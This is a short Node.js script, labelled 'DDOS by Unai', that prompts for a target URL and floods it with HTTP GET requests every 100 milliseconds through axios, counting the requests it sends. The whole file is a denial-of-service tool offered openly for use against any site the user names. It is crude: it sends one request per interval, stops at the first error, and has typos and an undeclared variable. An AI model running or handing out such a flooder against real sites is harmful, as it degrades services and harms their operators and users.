const axios = require("axios");
const readline = require("readline");
const rl = readline.createInterface({
	    input: process.stdin,
	    output: process.stdout
});
let requests = 0;
let imprimir = 10;
let msg = `
------------------------------
	DDOS by Unai
------------------------------
`
function ddos(url_){
	let interval = setInterval(function(){
		axios.get(url_)
		.then((response) => {
			requests++; 
			if(requests === imprimir){
			        console.log(`(${requests})Requests send it!`);
				imprimir = imprimir + 10;				
			}
		}, (error) => {
			console.log("An error ocurret, exiting...");
			$error = true;         			
			return clearInterval(interval);
	   	});
	}, 100)
}
console.log(msg);
rl.question("Url: ", function(url){
	console.log(`Starting ddos to ${url}`);
	ddos(url);
})
